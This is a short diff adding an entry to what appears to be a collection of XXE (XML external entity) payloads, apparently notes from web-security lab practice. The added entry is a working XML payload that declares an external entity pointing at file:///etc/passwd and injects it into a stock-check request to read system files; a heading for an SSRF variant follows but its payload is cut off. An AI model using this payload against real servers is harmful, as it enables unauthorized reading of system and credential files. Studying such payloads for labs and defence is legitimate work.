@@ -1,4 +1,10 @@
 
+### Exploiting XXE using external entities to retrieve files
+**Payload** :
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+```
 ### Exploiting XXE to perform SSRF attacks
 **Payload** : 
 ```xml
